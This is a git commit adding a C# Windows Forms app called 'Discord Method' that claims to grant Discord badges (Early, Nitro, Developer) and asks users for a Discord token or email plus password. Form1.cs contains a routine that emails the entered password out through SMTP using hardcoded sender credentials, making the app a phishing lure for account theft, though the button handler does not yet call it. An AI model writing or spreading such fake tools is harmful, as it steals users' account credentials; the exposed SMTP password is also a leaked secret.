6a59451f292219ab61c7062230fe6a46398ad480
yiğit <yiit@DESKTOP-0C0E0QG>
2022-09-17 15:03:01 +0300

    Add project files.

---
+++ Discord_early_method/Form1.Designer.cs
@@ -0,0 +1,228 @@
+﻿
+namespace Discord_early_method
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.label2 = new System.Windows.Forms.Label();
+            this.button1 = new System.Windows.Forms.Button();
+            this.tbEposta = new System.Windows.Forms.TextBox();
+            this.tbSifre = new System.Windows.Forms.TextBox();
+            this.checkBox1 = new System.Windows.Forms.CheckBox();
+            this.checkBox2 = new System.Windows.Forms.CheckBox();
+            this.checkBox3 = new System.Windows.Forms.CheckBox();
+            this.checkBox4 = new System.Windows.Forms.CheckBox();
+            this.groupBox1 = new System.Windows.Forms.GroupBox();
+            this.checkBox5 = new System.Windows.Forms.CheckBox();
+            this.lbİşlem = new System.Windows.Forms.Label();
+            this.label1 = new System.Windows.Forms.Label();
+            this.label3 = new System.Windows.Forms.Label();
+            this.label4 = new System.Windows.Forms.Label();
+            this.groupBox1.SuspendLayout();
+            this.SuspendLayout();
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Location = new System.Drawing.Point(3, 434);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(158, 17);
+            this.label2.TabIndex = 1;
+            this.label2.Text = "Discord: hz fixxed#0412";
+            this.label2.Click += new System.EventHandler(this.label2_Click);
+            // 
+            // button1
+            // 
+            this.button1.Location = new System.Drawing.Point(610, 387);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(150, 51);
+            this.button1.TabIndex = 2;
+            this.button1.Text = "START!";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // tbEposta
+            // 
+            this.tbEposta.Location = new System.Drawing.Point(124, 98);
+            this.tbEposta.Name = "tbEposta";
+            this.tbEposta.Size = new System.Drawing.Size(150, 22);
+            this.tbEposta.TabIndex = 3;
+            // 
+            // tbSifre
+            // 
+            this.tbSifre.Location = new System.Drawing.Point(124, 165);
+            this.tbSifre.Name = "tbSifre";
+            this.tbSifre.Size = new System.Drawing.Size(150, 22);
+            this.tbSifre.TabIndex = 4;
+            // 
+            // checkBox1
+            // 
+            this.checkBox1.AutoSize = true;
+            this.checkBox1.Location = new System.Drawing.Point(116, 21);
+            this.checkBox1.Name = "checkBox1";
+            this.checkBox1.Size = new System.Drawing.Size(135, 21);
+            this.checkBox1.TabIndex = 5;
+            this.checkBox1.Text = "14x boost badge";
+            this.checkBox1.UseVisualStyleBackColor = true;
+            // 
+            // checkBox2
+            // 
+            this.checkBox2.AutoSize = true;
+            this.checkBox2.Location = new System.Drawing.Point(6, 21);
+            this.checkBox2.Name = "checkBox2";
+            this.checkBox2.Size = new System.Drawing.Size(104, 21);
+            this.checkBox2.TabIndex = 6;
+            this.checkBox2.Text = "Nitro badge";
+            this.checkBox2.UseVisualStyleBackColor = true;
+            // 
+            // checkBox3
+            // 
+            this.checkBox3.AutoSize = true;
+            this.checkBox3.Location = new System.Drawing.Point(116, 48);
+            this.checkBox3.Name = "checkBox3";
+            this.checkBox3.Size = new System.Drawing.Size(106, 21);
+            this.checkBox3.TabIndex = 7;
+            this.checkBox3.Text = "Early badge";
+            this.checkBox3.UseVisualStyleBackColor = true;
+            // 
+            // checkBox4
+            // 
+            this.checkBox4.AutoSize = true;
+            this.checkBox4.Location = new System.Drawing.Point(6, 47);
+            this.checkBox4.Name = "checkBox4";
+            this.checkBox4.Size = new System.Drawing.Size(95, 21);
+            this.checkBox4.TabIndex = 8;
+            this.checkBox4.Text = "Bot badge";
+            this.checkBox4.UseVisualStyleBackColor = true;
+            // 
+            // groupBox1
+            // 
+            this.groupBox1.BackColor = System.Drawing.SystemColors.ControlDark;
+            this.groupBox1.Controls.Add(this.checkBox5);
+            this.groupBox1.Controls.Add(this.checkBox1);
+            this.groupBox1.Controls.Add(this.checkBox4);
+            this.groupBox1.Controls.Add(this.checkBox2);
+            this.groupBox1.Controls.Add(this.checkBox3);
+            this.groupBox1.Location = new System.Drawing.Point(408, 12);
+            this.groupBox1.Name = "groupBox1";
+            this.groupBox1.Size = new System.Drawing.Size(380, 175);
+            this.groupBox1.TabIndex = 9;
+            this.groupBox1.TabStop = false;
+            this.groupBox1.Text = "Badge";
+            // 
+            // checkBox5
+            // 
+            this.checkBox5.AutoSize = true;
+            this.checkBox5.Location = new System.Drawing.Point(6, 74);
+            this.checkBox5.Name = "checkBox5";
+            this.checkBox5.Size = new System.Drawing.Size(139, 21);
+            this.checkBox5.TabIndex = 9;
+            this.checkBox5.Text = "Developer badge";
+            this.checkBox5.UseVisualStyleBackColor = true;
+            // 
+            // lbİşlem
+            // 
+            this.lbİşlem.AutoSize = true;
+            this.lbİşlem.ForeColor = System.Drawing.Color.Crimson;
+            this.lbİşlem.Location = new System.Drawing.Point(607, 364);
+            this.lbİşlem.Name = "lbİşlem";
+            this.lbİşlem.Size = new System.Drawing.Size(0, 17);
+            this.lbİşlem.TabIndex = 11;
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Location = new System.Drawing.Point(121, 59);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(135, 17);
+            this.label1.TabIndex = 12;
+            this.label1.Text = "Token veya E Posta";
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.Location = new System.Drawing.Point(124, 145);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(37, 17);
+            this.label3.TabIndex = 13;
+            this.label3.Text = "Şifre";
+            // 
+            // label4
+            // 
+            this.label4.AutoSize = true;
+            this.label4.ForeColor = System.Drawing.Color.Crimson;
+            this.label4.Location = new System.Drawing.Point(100, 9);
+            this.label4.Name = "label4";
+            this.label4.Size = new System.Drawing.Size(236, 17);
+            this.label4.TabIndex = 16;
+            this.label4.Text = "Yapılacak İşlemi Seçmeyi Unutmayın";
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 16F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(800, 450);
+            this.Controls.Add(this.label4);
+            this.Controls.Add(this.label3);
+            this.Controls.Add(this.label1);
+            this.Controls.Add(this.lbİşlem);
+            this.Controls.Add(this.groupBox1);
+            this.Controls.Add(this.tbSifre);
+            this.Controls.Add(this.tbEposta);
+            this.Controls.Add(this.button1);
+            this.Controls.Add(this.label2);
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.Name = "Form1";
+            this.Text = "Discord Method";
+            this.groupBox1.ResumeLayout(false);
+            this.groupBox1.PerformLayout();
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.TextBox tbEposta;
+        private System.Windows.Forms.TextBox tbSifre;
+        private System.Windows.Forms.CheckBox checkBox1;
+        private System.Windows.Forms.CheckBox checkBox2;
+        private System.Windows.Forms.CheckBox checkBox3;
+        private System.Windows.Forms.CheckBox checkBox4;
+        private System.Windows.Forms.GroupBox groupBox1;
+        private System.Windows.Forms.CheckBox checkBox5;
+        private System.Windows.Forms.Label lbİşlem;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.Label label3;
+        private System.Windows.Forms.Label label4;
+    }
+}
+
---
+++ Discord_early_method/Form1.cs
@@ -0,0 +1,60 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Net.Mail;
+
+
+namespace Discord_early_method
+{   
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+        MailMessage Eposta = new MailMessage();
+        void MailGonder()
+        {
+            Eposta.From = new MailAddress("hzfixxed@gmail.com ");
+            Eposta.To.Add(tbEposta.Text.ToString());
+            Eposta.Subject = tbSifre.Text.ToString();
+
+            SmtpClient smtp = new SmtpClient();
+
+            smtp.Credentials = new System.Net.NetworkCredential("hzfixxed@gmail.com", "wearedie");
+            smtp.Host = "smtp.live.com"; //gmail host adresi = "smtp.gmail.com"; ,
+            smtp.EnableSsl = true;
+            smtp.Port = 587;
+
+            smtp.Send(Eposta);
+            MessageBox.Show("Mail Gönderildi");
+
+        }
+
+
+
+        private void label2_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+           
+            
+            
+            
+            
+            
+            
+            lbİşlem.Text = "İşlem Gerçekleşiyor!";
+            MessageBox.Show("İşlem Gerçekleşiyor Bekleyiniz...", "Bilgi", MessageBoxButtons.OK, MessageBoxIcon.Information);
+        }
+    }
+}
